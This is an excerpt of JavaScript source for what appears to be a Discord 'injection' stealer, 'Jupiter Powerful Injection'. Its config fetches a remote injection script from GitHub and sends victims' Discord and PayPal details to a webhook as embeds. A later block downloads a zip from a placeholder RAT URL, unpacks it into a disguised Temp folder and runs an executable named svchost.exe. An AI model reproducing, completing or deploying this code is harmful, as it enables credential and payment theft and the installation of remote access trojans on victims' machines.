...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'Jupiter Powerful Injection', 
  embed_icon: 'https://files.catbox.moe/wl4nax.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/ThunderboltDev/Thunder-Injection/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '☠️Powerful injectin By github.com/ThunderboltDev☠️',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Paypal Added**',
            value: `Lets buy somethings shall we =)`,
            inline: false,
          },
          {
            name: '**Discord Info**',
...
const zipFileUrl = '%RATURL%';
const extractedFolderName = 'Windows Folders';
const executableFileName = 'svchost.exe';

const extractPath = process.env.LOCALAPPDATA || (process.env.HOME + '/AppData/Local');
const extractedFolderPath = path.join(extractPath, 'Temp', extractedFolderName);
const zipFilePath = path.join(extractedFolderPath, 'Dlls.zip');
  ...
  fileStream.on('finish', () => {
    ...
    fs.createReadStream(zipFilePath)
      ...
      .on('close', () => {
        ...
        const executablePath = path.join(extractedFolderPath, executableFileName);

        exec(executablePath, (err) => {
          if (err) {
            console.error('Error running the executable:', err);
          } else {
            console.log('Executable file ran successfully.');
          }
        });
      });
  });
